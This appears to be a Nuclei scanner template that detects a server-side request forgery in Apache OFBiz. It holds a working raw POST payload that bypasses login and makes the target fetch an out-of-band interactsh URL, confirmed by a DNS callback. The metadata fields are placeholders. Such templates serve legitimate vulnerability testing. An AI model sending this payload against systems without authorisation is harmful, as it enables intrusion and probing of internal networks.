id: Apache-OFBiz-SSRF

info:
  name: Template Name
  author: apple
  severity: high
  description: description
  reference:
    - https://github.com/wy876/POC/blob/22292223ef93b925180d27ef528aca26ba25a919/Apache%20OFBiz%20SSRF%20%26%26%20%E4%BB%BB%E6%84%8F%E9%85%8D%E7%BD%AE%E8%AF%BB%E5%8F%96.md
  tags: tags

http:
  - raw:
      - |-
        POST /webtools/control/getJSONuiLabelArray/?USERNAME=&PASSWORD=s&requirePasswordChange=Y HTTP/1.1
        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
        Accept-Language: zh-CN,zh;q=0.9
        Connection: close
        Cache-Control: no-cache
        Pragma: no-cache
        Host: {{Hostname}}
        Content-type: application/x-www-form-urlencoded
        Content-Length: 148

        requiredLabels={"http://{{interactsh-url}}/":["xxxxxx"]}
    matchers:
      - type: word
        part: interactsh_protocol # Confirms the DNS Interaction
        words:
          - "dns"